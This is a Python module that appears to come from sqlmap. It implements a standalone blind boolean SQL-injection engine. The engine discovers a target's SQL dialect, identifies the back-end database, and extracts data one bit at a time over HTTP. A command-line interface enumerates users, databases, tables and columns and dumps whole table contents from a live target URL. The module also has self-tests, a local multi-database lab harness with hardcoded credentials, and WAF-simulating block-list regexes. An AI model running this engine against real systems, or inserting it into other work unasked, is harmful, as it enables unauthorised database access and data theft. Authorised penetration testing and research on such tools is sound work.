#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from .atlas import _REPL
from .engine import Esperanto, hostExtract
from .records import (
    OracleUndecided, ExtractResult, QueryBudgetExceeded)


def _sqliteOracle(block=None):
    """In-memory SQLite boolean oracle for the self-test (DBMS hidden from prober).
    `block` is a regex of constructs to refuse, used to force fallback modes."""
    import re as _re
    import sqlite3
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE users (id INTEGER, name TEXT)")
    con.execute("INSERT INTO users VALUES (1, 'Admin-42')")
    con.commit()
    pat = _re.compile(block) if block else None

    def oracle(condition):
        if pat and pat.search(condition):
            return False
        try:
            cur = con.execute("SELECT CASE WHEN (%s) THEN 1 ELSE 0 END" % condition)
            return cur.fetchone()[0] == 1
        except sqlite3.DatabaseError:
            # unsupported/rejected SQL is a valid negative capability result; only
            # transport/observation failures are allowed to raise (oracle contract)
            return False

    return oracle


def _selftest():
    # exercise every compare mode against one byte-ordered, case-sensitive backend
    # (SQLite) by selectively refusing constructs - proves each extraction path
    code = r"\b(ASCII|UNICODE|ORD|CODEPOINT|ASCII_VAL|ASCW|UNICODE_CODE|TO_CODE_POINTS)\("
    coll = r"COLLATE|\bBINARY\s*\(|AS\s+(BLOB|bytea|VARBINARY|RAW)|NLSSORT|UTL_RAW"
    hexb = r"\bHEX\(|RAWTOHEX|ENCODE\(|BINTOHEX|HEX_ENCODE|TO_HEX|BINTOSTR"
    modes = (
        ("code",      None),
        ("collation", r"(?i)(%s)" % code),
        ("hex",       r"(?i)(%s|%s)" % (code, coll)),
        ("ordinal",   r"(?i)(%s|%s|%s)" % (code, coll, hexb)),
    )
    for expected, block in modes:
        esp = Esperanto(_sqliteOracle(block=block))
        dialect = esp.discover()
        got = esp.extract("(SELECT name FROM users WHERE id=1)")
        assert dialect.compare == expected, "expected %s mode, got %s" % (expected, dialect.compare)
        assert got == "Admin-42", "%s-mode extraction failed: %r" % (expected, got)
        print("  %-8s mode: %-52r -> extracted %r in %d queries" % (
            expected, dialect, got, esp.queryCount))
    # equality mode exercised directly (charset scan)
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    esp.dialect.compare = "equality"
    assert esp.extract("(SELECT name FROM users WHERE id=1)") == "Admin-42"
    print("  equality mode: charset-scan extraction -> OK")

    # the detective: name the backend blind
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    verdict = esp.identify()
    assert verdict["product"] == "SQLite", "identify failed: %r" % verdict
    print("  identify: product=%(product)r version=%(version)r dual=%(dual)s" % verdict)

    # bytes-first extraction: byte-exact, encoding chosen by the caller
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    mb = "('A' || CHAR(233) || CHAR(8364))"       # 'A' + U+00E9 + U+20AC, built via ASCII SQL (py2/py3-safe, no non-ASCII source)
    raw = esp.extractBytes(mb)
    assert raw == u"A\xe9\u20ac".encode("utf-8"), "extractBytes: %r" % raw
    assert esp.extractText(mb) == u"A\xe9\u20ac"
    print("  extractBytes: %r  extractText: %r" % (raw, esp.extractText(mb)))

    # quorum: a noisy oracle that flips/errors a minority of probes must not corrupt.
    # tested across several seeds so the pass doesn't hinge on one lucky sequence.
    import random as _random
    for seed in (1234, 7, 99, 2026):
        base = _sqliteOracle()
        rng = _random.Random(seed)

        def noisy(cond, _b=base, _r=rng):
            roll = _r.random()
            if roll < 0.12:
                raise RuntimeError("transient")         # 12% errors (resampled)
            if roll < 0.20:
                return not _b(cond)                     # 8% lies
            return _b(cond)

        esp = Esperanto(noisy, quorum=6)
        esp.discover()
        got = esp.extract("(SELECT name FROM users WHERE id=1)")
        assert got == "Admin-42", "quorum extraction (seed %d) failed: %r" % (seed, got)
    print("  quorum=6 under 20%% noisy oracle (12%% err + 8%% lies) -> 'Admin-42' across 4 seeds")

    # -- integrity guards (peer-review round 4) --------------------------------
    # empty/NULL are falsey; a bounded prefix (incl. limit=0) is incomplete+truncated
    assert not ExtractResult("") and not ExtractResult(None)
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    zero = esp.extractResult("'abc'", limit=0)
    assert zero.value == "" and zero.truncated and not zero.complete, "limit=0: %r" % zero
    # an invalid expression must NOT masquerade as a complete SQL NULL
    bad = esp.extractResult("NO_SUCH_FN(1)")
    assert bad.value is None and not bad.is_null and not bad.complete and bad.warnings, "invalid->NULL: %r" % bad
    # integer extraction must raise, not saturate
    try:
        esp.extractInteger("100", maximum=10)
        assert False, "extractInteger saturated silently"
    except OverflowError:
        pass
    # an unobservable oracle must FAIL CLOSED, never silently 'succeed'. two guarantees:
    # (a) discovery aborts (a broken oracle can't manufacture a working dialect); while
    #     probing candidate rungs an unobservable probe reads False, so sanity fails ->
    #     RuntimeError, never a bogus discovered dialect
    try:
        Esperanto((lambda c: (_ for _ in ()).throw(RuntimeError("down")))).discover()
        assert False, "broken oracle silently discovered a dialect"
    except RuntimeError:
        pass
    # (b) a DATA READ never manufactures False from an unobservable probe: it raises
    #     OracleUndecided (the whole point - a flaky read must not corrupt a bit)
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    esp.oracle = lambda c: (_ for _ in ()).throw(RuntimeError("down"))   # break it post-discovery
    try:
        esp.extract("(SELECT MAX(name) FROM users)")
        assert False, "undecided oracle silently became data"
    except OracleUndecided:
        pass
    # embedded/leading NUL must not truncate (whole-value verification recovers it)
    import sqlite3
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE t (a TEXT)")
    con.execute("INSERT INTO t VALUES (?)", ("A\x00B",))
    con.commit()

    def nulOracle(cond):
        try:
            return con.execute("SELECT CASE WHEN (%s) THEN 1 ELSE 0 END" % cond).fetchone()[0] == 1
        except sqlite3.DatabaseError:
            return False
    esp = Esperanto(nulOracle)
    esp.discover()
    nul = esp.extractResult("(SELECT a FROM t)")
    assert nul.value == "A\x00B" and nul.complete, "embedded NUL: %r" % nul

    # -- round-5 adversarial regressions --------------------------------------
    esp = Esperanto(_sqliteOracle(), maxlen=0)
    esp.discover()
    z = esp.extractResult("'abc'")
    assert z.value == "" and z.truncated and not z.complete, "maxlen=0: %r" % z
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    for bad in (("-100", 10), ("100", 10)):     # symmetric integer cap
        try:
            esp.extractInteger(bad[0], maximum=bad[1])
            assert False, "int cap not enforced for %s" % bad[0]
        except OverflowError:
            pass
    try:                                        # None observation -> undecided
        Esperanto(lambda c: None, retries=0)._ask("1=1")
        assert False, "None became False"
    except OracleUndecided:
        pass
    try:                                        # hard query budget
        Esperanto(_sqliteOracle(), max_queries=0)._ask("1=1")
        assert False, "budget not enforced"
    except QueryBudgetExceeded:
        pass
    esp = Esperanto(_sqliteOracle())           # ordered PoC refused in equality mode
    esp.discover()
    esp.dialect.compare = "equality"
    try:
        esp.poc("'A'")
        assert False, "equality-mode PoC fabricated ordering"
    except RuntimeError:
        pass
    # a UTF-16 code-unit fn returning an isolated surrogate must not be "complete"
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE s (v TEXT)")
    con.execute(u"INSERT INTO s VALUES ('\U0001F642')")
    con.create_function("ASCII", 1, lambda x: None if not x else (
        ord(x[0]) if ord(x[0]) <= 0xFFFF else 0xD800 + ((ord(x[0]) - 0x10000) >> 10)))
    con.commit()
    nohex = __import__("re").compile(r"(?i)\bHEX\(|RAWTOHEX|ENCODE\(|BINTOHEX|HEX_ENCODE|TO_HEX|BINTOSTR")

    def surOracle(cond):
        if nohex.search(cond):
            return False
        try:
            return con.execute("SELECT CASE WHEN (%s) THEN 1 ELSE 0 END" % cond).fetchone()[0] == 1
        except sqlite3.DatabaseError:
            return False
    esp = Esperanto(surOracle)
    esp.discover()
    sur = esp.extractResult("(SELECT v FROM s)")
    assert sur.value == _REPL and not sur.complete, "isolated surrogate accepted: %r" % sur

    print("  integrity: fail-closed + NULL/empty + limit0 + int-cap + budget + surrogate + PoC -> guarded")

    # -- InferenceStrategy: the frozen hand-off is a *sufficient* host interface --
    oracle = _sqliteOracle()
    esp = Esperanto(oracle)
    esp.discover()
    strat = esp.strategy()
    try:                                            # immutable
        strat.compare_mode = "x"
        assert False, "strategy is not frozen"
    except AttributeError:
        pass
    # extract using ONLY the strategy + oracle (no Esperanto retrieval code)
    got = hostExtract(oracle, strat, "(SELECT name FROM users WHERE id=1)")
    assert got == "Admin-42", "hostExtract via strategy failed: %r" % got
    row = strat.asQueriesRow()
    assert row["substring"] and row["length"] and row["inference"], "queries-row incomplete: %r" % row
    print("  strategy: frozen + hostExtract('%s')=%r + queries.xml row rendered" % (strat.compare_mode, got))
    print("SELF-TEST PASSED (all compare modes + identify + bytes + quorum + integrity + strategy)")


def _livetest(only=None, waf=False):
    """Live blind validation against real DBMS instances (dev harness, '--live').
    Each backend is handed ONLY a boolean oracle - dialect-mismatch errors read as
    False, the transaction rolled back per probe - and is never told which engine it
    is poking. Requires the driver + a reachable instance; skips what it can't reach."""
    import re as _re
    SECRET = "Zagreb-Ka5tel"
    block = _re.compile(r"(?i)\b(ASCII|UNICODE|ORD|CODEPOINT|ASCII_VAL|ASCW|UNICODE_CODE|CODE)\s*\(") if waf else None

    def cursor(con, wrap):
        def ask(cond):
            if block and block.search(cond):
                return False
            cur = con.cursor()
            try:
                cur.execute(wrap % cond)
                row = cur.fetchone()
                return bool(row) and int(row[0]) == 1
            except Exception:
                try:
                    con.rollback()
                except Exception:
                    pass
                return False
            finally:
                try:
                    cur.close()
                except Exception:
                    pass
        return ask

    def prep(con, ddl):
        cur = con.cursor()
        for stmt in ddl:
            try:
                cur.execute(stmt)
            except Exception:
                if hasattr(con, "rollback"):
                    con.rollback()
        con.commit()
        cur.close()

    def sqlite():
        import sqlite3
        con = sqlite3.connect(":memory:")
        prep(con, ("CREATE TABLE esp_probe (name TEXT)", "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    def mysql():
        import pymysql
        con = pymysql.connect(host="127.0.0.1", port=13306, user="root", password="root", database="lab")
        prep(con, ("DROP TABLE IF EXISTS esp_probe", "CREATE TABLE esp_probe (name VARCHAR(64))",
                   "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    def postgres():
        import psycopg2
        con = psycopg2.connect(host="127.0.0.1", port=15432, user="esp", password="pass", dbname="espdb")
        prep(con, ("DROP TABLE IF EXISTS esp_probe", "CREATE TABLE esp_probe (name VARCHAR(64))",
                   "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    def oracle():
        import oracledb
        con = oracledb.connect(user="appu", password="appu", dsn="127.0.0.1:1521/FREEPDB1")
        prep(con, ("BEGIN EXECUTE IMMEDIATE 'DROP TABLE esp_probe'; EXCEPTION WHEN OTHERS THEN NULL; END;",
                   "CREATE TABLE esp_probe (name VARCHAR2(64))", "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END FROM DUAL")

    def mssql():
        import pymssql
        con = pymssql.connect(server="127.0.0.1", port="11433", user="sa", password="Esp_pass123", database="master")
        prep(con, ("IF OBJECT_ID('esp_probe') IS NOT NULL DROP TABLE esp_probe",
                   "CREATE TABLE esp_probe (name VARCHAR(64))", "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    ok = True
    for name, factory in (("SQLite", sqlite), ("MySQL", mysql), ("PostgreSQL", postgres),
                          ("Oracle", oracle), ("MSSQL", mssql)):
        if only and name.lower() not in only:
            continue
        try:
            oracle_fn = factory()
        except Exception as ex:
            print("  %-12s SKIP (%s)" % (name, ex))
            continue
        esp = Esperanto(oracle_fn)
        try:
            esp.discover()
            got = esp.extract("(SELECT MAX(name) FROM esp_probe)")
            product = esp.identify()["product"]
        except Exception as ex:
            print("  %-12s FAIL (%s)" % (name, ex))
            ok = False
            continue
        passed = got == SECRET
        ok = ok and passed
        print("  %-12s %s  product=%-12r secret=%r%s" % (
            name, "PASS" if passed else "FAIL", product, got, "  [WAF]" if waf else ""))
    return ok


def _httpOracle(url, data=None, cookie=None, headers=None, string=None, notString=None, code=None):
    """A boolean oracle over a real HTTP target, for standalone use. The condition is
    substituted at the injection marker: '[INFERENCE]' is replaced verbatim (you supply
    the context, e.g. `id=1 AND [INFERENCE]`), else a single '*' is replaced with
    ` AND (<condition>)`.

    True/false is decided by a reduced port of sqlmap's response differentiation - the
    Pareto 80%: explicit --string/--not-string/--code win; otherwise it CALIBRATES from
    two true (1=1) baselines + one false (1=2) and auto-picks the cheapest reliable
    signal - HTTP status code, else a stable text line present in true but not false,
    else a difflib similarity ratio. Two noise-killers borrowed from sqlmap make it
    robust: DYNAMIC content (lines that differ between two identical true requests, e.g.
    timestamps/CSRF/nonces) is stripped, and the REFLECTED injected condition is removed
    from the body so it can't skew the match (sqlmap's "reflective values ... filtering
    out"). Not a replacement for checkBooleanExpression - just its high-value core."""
    import difflib
    try:                                                    # py3
        from urllib.parse import quote as _quote, urlsplit
        from http.client import HTTPConnection, HTTPSConnection
    except ImportError:                                     # py2
        from urllib import quote as _quote
        from urlparse import urlsplit
        from httplib import HTTPConnection, HTTPSConnection

    if "[INFERENCE]" not in (url + (data or "")) and "*" not in (url + (data or "")):
        url = url + "*"                     # no marker given -> inject at the end of the URL by default
        print("[*] no injection marker ('*' or '[INFERENCE]') given; defaulting to end of URL: %s" % url)

    # ONE kept-alive connection reused across every probe. a blind dump is thousands of
    # requests; opening a fresh TCP+TLS handshake per probe (what urlopen does) is ~0.2s of
    # pure handshake that dwarfs the request itself - reuse drops per-probe latency ~5-10x.
    _conn = {"c": None, "key": None}

    def _fresh(scheme, netloc):
        return (HTTPSConnection if scheme == "https" else HTTPConnection)(netloc, timeout=30)

    def fetch(cond):
        if "[INFERENCE]" in (url + (data or "")):           # verbatim (caller owns the context)
            u_raw = url.replace("[INFERENCE]", cond)
            d_raw = data.replace("[INFERENCE]", cond) if data else data
        else:                                               # '*' -> boolean AND at the mark
            ins = " AND (%s)" % cond
            u_raw = url.replace("*", ins, 1) if "*" in url else url
            d_raw = data.replace("*", ins, 1) if (data and "*" in data) else data
        # keep the '='/'&' param structure, encode the rest so spaces/metachars survive
        parts = urlsplit(u_raw)
        path = parts.path or "/"
        if parts.query:
            path += "?" + _quote(parts.query, safe="=&")
        body = _quote(d_raw, safe="=&").encode("utf-8") if d_raw else None
        method = "POST" if body else "GET"
        hdrs = {"User-Agent": "esperanto", "Connection": "keep-alive"}
        if body:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        if cookie:
            hdrs["Cookie"] = cookie
        for h in (headers or []):
            k, _, v = h.partition(":")
            hdrs[k.strip()] = v.strip()
        key = (parts.scheme, parts.netloc)
        for attempt in (1, 2):                              # reuse the socket; reconnect once if it dropped
            if _conn["c"] is None or _conn["key"] != key:
                if _conn["c"] is not None:
                    try:
                        _conn["c"].close()
                    except Exception:
                        pass
                _conn["c"], _conn["key"] = _fresh(parts.scheme, parts.netloc), key
            try:
                _conn["c"].request(method, path, body, hdrs)
                resp = _conn["c"].getresponse()             # http.client returns 4xx/5xx too (no raise)
                raw, status = resp.read(), resp.status      # read fully so the socket stays reusable
                return raw.decode("utf-8", "replace"), status
            except Exception:
                try:
                    _conn["c"].close()
                except Exception:
                    pass
                _conn["c"] = None                           # force a reconnect on the retry
        return "", 0

    dyn = set()

    def _deReflect(body, cond):
        return body.replace(cond, "") if cond else body     # drop the reflected payload

    def _clean(body, cond):
        body = _deReflect(body, cond)
        return "\n".join(ln for ln in body.split("\n") if ln not in dyn) if dyn else body

    mode, wanted, base = None, None, {}
    if string is not None:
        mode = "string"
    elif notString is not None:
        mode = "notstring"
    elif code is not None:
        mode, wanted = "code", int(code)
    else:                                                   # auto-calibrate
        (t1, s1), (t2, s2), (f1, sf) = fetch("1=1"), fetch("1=1"), fetch("1=2")
        dyn = set(t1.split("\n")) ^ set(t2.split("\n"))     # varies between identical requests -> dynamic
        tc, fc = _clean(t1, "1=1"), _clean(f1, "1=2")
        if s1 == s2 and s1 != sf:                           # (1) HTTP status alone separates true/false
            mode, wanted = "code", s1
        else:
            # (2) a SHORT distinctive true-only marker: the longest contiguous chunk that is
            # in the true page but not the false one, capped to a "longish" string (never the
            # whole document) and verified stable across BOTH true baselines
            t2c = _clean(t2, "1=1")
            blocks = difflib.SequenceMatcher(None, fc, tc, autojunk=False).get_opcodes()
            chunks = sorted((tc[b1:b2].strip() for op, _a1, _a2, b1, b2 in blocks
                             if op in ("insert", "replace")), key=len, reverse=True)
            wanted = None
            for chunk in chunks:
                marker = chunk[:64]                         # bounded, distinctive marker
                if len(marker) >= 6 and marker in t2c and marker not in fc:
                    mode, wanted = "autostring", marker
                    break
            if wanted is None:                              # (3) similarity ratio floor
                mode, base = "ratio", {"t": tc, "f": fc}
    if not string and not notString:
        print("[*] calibrated oracle: %s%s" % (mode, (" (%r)" % wanted) if mode in ("code", "autostring") else ""))

    def oracle(cond):
        body, status = fetch(cond)
        if mode == "string":
            return string in body
        if mode == "notstring":
            return notString not in body
        if mode == "code":
            return status == wanted
        if mode == "autostring":
            return wanted in _clean(body, cond)
        c = _clean(body, cond)
        st = difflib.SequenceMatcher(None, c, base["t"]).quick_ratio()
        sf = difflib.SequenceMatcher(None, c, base["f"]).quick_ratio()
        return st >= sf

    return oracle


def _report(esp, args):
    """Run the requested action(s) against a discovered target and print the results."""
    print("[*] dialect: %r" % esp.dialect)
    verdict = esp.identify()
    print("[*] back-end: %s %s" % (verdict.get("product") or "unknown", verdict.get("version") or ""))
    # scope schema/db lookups to -D, else the current database (and, for a specific table,
    # the schema it actually lives in) - WITHOUT this a table that ALSO exists in a system
    # schema (e.g. MySQL's mysql/information_schema 'users') merges columns and yields a
    # garbage 0-row dump. mirrors the sqlmap handler's _scopeFor.
    scope = args.db
    if scope is None and (args.tables or args.columns or args.dump):
        dbexpr = esp.dialect.identity.get("database")
        try:
            cur = esp.extract(dbexpr) if dbexpr else None
        except Exception:
            cur = None
        if args.tbl and (args.columns or args.dump):
            try:
                scope = cur if (cur and esp.hasTable(args.tbl, cur)) else (esp.tableSchema(args.tbl) or cur)
            except Exception:
                scope = cur
        else:
            scope = cur
        if scope:
            print("[*] scoping to database/schema: %s" % scope)
    if args.current_user:
        expr = esp.dialect.identity.get("user")
        print("[*] current user: %s" % (esp.extract(expr) if expr else "n/a"))
    if args.current_db:
        expr = esp.dialect.identity.get("database")
        print("[*] current database: %s" % (esp.extract(expr) if expr else "n/a"))
    if args.tables:
        print("[*] fetching tables ...")
        print("[*] tables: %s" % ", ".join(esp.enumerate("table", schema=scope) or ["<none>"]))
    if args.columns:
        if not args.tbl:
            print("[!] --columns needs -T <table>")
        else:
            print("[*] fetching columns for '%s' ..." % args.tbl)
            print("[*] columns of %s: %s" % (args.tbl, ", ".join(esp.columns(args.tbl, schema=scope) or ["<none>"])))
    if args.query:
        print("[*] fetching %s ..." % args.query)
        print("[*] %s = %r" % (args.query, esp.extract(args.query)))
    if args.dump:
        if not args.tbl:
            print("[!] --dump needs -T <table>")
        else:
            cols = [c.strip() for c in args.col.split(",")] if args.col else None
            if cols is None:                    # enumerate columns FIRST (own phase), so the
                print("[*] fetching columns for table '%s' ..." % args.tbl)   # 'entries' phase below streams ROWS, not column names
                cols = esp.columns(args.tbl, schema=scope) or None
            print("[*] fetching entries for table '%s' ..." % args.tbl)
            result = esp.dump(args.tbl, columns=cols, schema=scope)
            if not result or not result["columns"]:
                print("[!] could not dump %s" % args.tbl)
            else:
                print("[*] %s (%d rows):" % (args.tbl, len(result["rows"])))
                print("    " + " | ".join(result["columns"]))
                for row in result["rows"]:
                    print("    " + " | ".join("NULL" if v is None else v for v in row))


def main(argv=None):
    """Standalone entry point: drive the engine against a live HTTP target."""
    import argparse

    class _Formatter(argparse.HelpFormatter):
        # show the metavar ONCE ('-H, --header HEADER', not '-H HEADER, --header HEADER'),
        # like sqlmap's own help, so option/help stays on a single line
        def __init__(self, prog):
            argparse.HelpFormatter.__init__(self, prog, max_help_position=28)

        def _format_action_invocation(self, action):
            if not action.option_strings or action.nargs == 0:
                return ", ".join(action.option_strings) or argparse.HelpFormatter._format_action_invocation(self, action)
            metavar = self._format_args(action, action.dest.upper())    # py2/py3-portable default metavar
            return "%s %s" % (", ".join(action.option_strings), metavar)

    parser = argparse.ArgumentParser(
        prog="esperanto", formatter_class=_Formatter,
        description="DBMS-agnostic blind-SQLi enumeration engine (standalone)")
    parser.add_argument("-u", "--url", help="target URL (with a '*'/'[INFERENCE]' marker)")
    parser.add_argument("--data", help="POST data string")
    parser.add_argument("--cookie", help="HTTP Cookie header")
    parser.add_argument("-H", "--header", action="append", help="extra HTTP header (repeatable)")
    parser.add_argument("--string", help="match string for a True response")
    parser.add_argument("--not-string", dest="not_string", help="match string for a False response")
    parser.add_argument("--code", type=int, help="HTTP code for a True response")
    parser.add_argument("--banner", action="store_true", help="retrieve DBMS banner")
    parser.add_argument("--current-user", action="store_true", dest="current_user", help="retrieve current user")
    parser.add_argument("--current-db", action="store_true", dest="current_db", help="retrieve current database")
    parser.add_argument("--tables", action="store_true", help="enumerate tables")
    parser.add_argument("--columns", action="store_true", help="enumerate table columns (needs -T)")
    parser.add_argument("--dump", action="store_true", help="dump table entries (needs -T)")
    parser.add_argument("--sql-query", dest="query", help="run a custom scalar SQL query")
    parser.add_argument("-D", dest="db", help="database/schema to enumerate")
    parser.add_argument("-T", dest="tbl", help="table to enumerate")
    parser.add_argument("-C", dest="col", help="columns to dump (comma-separated)")
    # internal dev/test harness switches - functional but hidden from --help (--live drives the
    # local-Docker DBMS livetest; --waf is a livetest-only fault-injection mode, NOT a real WAF bypass)
    parser.add_argument("--live", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--waf", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--self-test", action="store_true", dest="selftest", help=argparse.SUPPRESS)
    args, engines = parser.parse_known_args(argv)

    if args.live:
        names = [a.lower() for a in engines if not a.startswith("-")]
        return 0 if _livetest(only=names or None, waf=args.waf) else 1
    if args.selftest:                       # self-test only on EXPLICIT request
        _selftest()
        return 0
    if not args.url:                        # no target and nothing to do -> show help, don't surprise
        parser.print_help()
        return 1

    target = args.url if "://" in args.url else ("http://" + args.url)   # tolerate a scheme-less URL
    esp = Esperanto(_httpOracle(target, args.data, args.cookie, args.header,
                                args.string, args.not_string, args.code))
    import sys as _sys
    def _live(value):                           # signs of life during the (slow, blind) extraction
        _sys.stdout.write("[*] retrieved: %s\n" % value)
        _sys.stdout.flush()
    esp._progress = _live
    print("[*] discovering the back-end SQL dialect (agnostic mode) ...")
    try:
        esp.discover()
        _report(esp, args)
    except RuntimeError as ex:              # unreachable/uninjectable target -> clean message, no traceback
        print("[!] could not establish a working boolean oracle (%s)" % ex)
        print("    check the target is reachable and injectable, and the marker/--string/--code are right")
        return 1
    except KeyboardInterrupt:               # Ctrl-C mid-extraction -> clean stop, no traceback
        print("\n[!] aborted by user")
        return 1
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
